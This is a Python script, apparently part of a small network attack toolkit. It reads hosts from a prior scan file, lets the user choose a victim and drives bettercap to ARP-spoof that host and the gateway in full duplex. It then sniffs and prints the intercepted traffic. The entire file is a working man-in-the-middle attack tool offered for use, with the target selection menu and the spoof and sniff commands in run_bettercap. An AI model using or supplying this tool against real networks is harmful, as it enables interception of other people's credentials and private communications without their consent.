import json
import os
import subprocess
import netifaces
from pathlib import Path
import sys
import select
import threading
import time

def get_gateway_ip():
    gws = netifaces.gateways()
    default_gw = gws.get('default', {})
    if default_gw and default_gw.get(netifaces.AF_INET):
        return default_gw[netifaces.AF_INET][0]
    return None

def load_hosts(json_file: str):
    with open(json_file, "r") as f:
        data = json.load(f)

    hosts = []
    if data.get("hosts"):
        for host in data.get("hosts", []):
            ip = host.get("ip")
            mac = host.get("mac", "N/A")
            hosts.append((ip, mac))
    elif data.get("scan_parsed"):
        for host in data.get("scan_parsed", []):
            ip = host.get("ip")
            mac = host.get("mac", "N/A")
            hosts.append((ip, mac))

    return hosts, data

def delete_scan_files(prefix: Path):
    prefix = prefix.with_suffix("") 
    suffixes = [".json"]
    for suf in suffixes:
        f = Path(str(prefix) + suf)
        if f.exists():
            try:
                os.remove(f)
            except Exception:
                pass

def show_menu():
    print("\n" + "=" * 50)
    print(" MITM Attack ")
    print("=" * 50)
    print("1. ARP Spoofing")
    print("2. Exit")

def output_reader(proc, stop_event, show_output):
    while not stop_event.is_set():
        try:
            if proc.stdout:
                line = proc.stdout.readline()
                if line:
                    if show_output.is_set():
                        stripped = line.strip()
                        if stripped:
                            print(f"  {stripped}", flush=True)
                elif proc.poll() is not None:
                    break
        except:
            break

def send_command(proc, cmd, delay=0.5):
    try:
        proc.stdin.write(cmd + "\n")
        proc.stdin.flush()
        time.sleep(delay)
    except:
        pass

def run_bettercap(iface="wlan0", target_ip=None, gateway_ip=None):
    cmd = ["bettercap", "-iface", iface]
    
    print(f"Starting Bettercap on {iface}...")
    print(f"Target: {target_ip}")
    print(f"Gateway: {gateway_ip}")
    
    proc = subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    stop_event = threading.Event()
    show_output = threading.Event() 
    output_thread = threading.Thread(target=output_reader, args=(proc, stop_event, show_output), daemon=True)
    output_thread.start()
    
    print("Initializing...")
    time.sleep(2)
    
    print("Probing network...")
    send_command(proc, "net.probe on", delay=3)
    
    print("Configuring ARP spoof...")
    send_command(proc, f"set arp.spoof.targets {target_ip}", delay=0.3)
    if gateway_ip:
        send_command(proc, f"set arp.spoof.gateway {gateway_ip}", delay=0.3)
    send_command(proc, "set arp.spoof.fullduplex true", delay=0.3)
    
    print("\n" + "=" * 50)
    print(" ARP SPOOFING + SNIFFING ACTIVE")
    print("=" * 50)
    
    show_output.set()  

    send_command(proc, "arp.spoof on", delay=0.5)
    send_command(proc, "net.sniff on", delay=0.5)
    
    print("Press Enter to stop...")
    
    try:
        while proc.poll() is None:
            rlist, _, _ = select.select([sys.stdin], [], [], 0.5)
            if rlist:
                sys.stdin.readline()
                break
    except KeyboardInterrupt:
        pass
    
    show_output.clear()
    print("\nStopping attack...")
    send_command(proc, "arp.spoof off", delay=0.1)
    send_command(proc, "net.sniff off", delay=0.1)
    send_command(proc, "net.probe off", delay=0.1)
    send_command(proc, "exit", delay=0.1)
    
    stop_event.set()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.terminate()
        proc.wait(timeout=2)
    
    print("Attack stopped successfully")



def main():
   
    try:
        hosts, data = load_hosts("scan_result.json")
    except FileNotFoundError:
        print("Error: scan_result.json not found. Run a scan first.")
        return
    except json.JSONDecodeError:
        print("Error: Invalid JSON in scan_result.json")
        return

    if not hosts:
        print("No hosts found in scan results.")
        return

    default_iface = data.get("iface", "wlan0")
    gateway_ip = get_gateway_ip()

    print("Hosts discovered:")
    for i, (ip, mac) in enumerate(hosts, 1):
        print(f"{i}. IP: {ip}, MAC: {mac}")

    while True:
        try:
            choice = int(input("Select the host to attack (number): "))
            if 1 <= choice <= len(hosts):
                break
            print(f"Choose a number between 1 and {len(hosts)}.")
        except ValueError:
            print("Enter a valid number.")

    target_ip = hosts[choice-1][0]
    target_mac = hosts[choice-1][1]
    
    print(f"Target: {target_ip} ({target_mac})")

    while True:
        show_menu()
        opt = input("Choose an option: ")
        if opt == "1":
            run_bettercap(iface=default_iface, target_ip=target_ip, gateway_ip=gateway_ip)
        elif opt == "2":
            print("Exiting...")
            break
        else:
            print("Invalid option. Please choose 1 or 2.")

if __name__ == "__main__":
    main()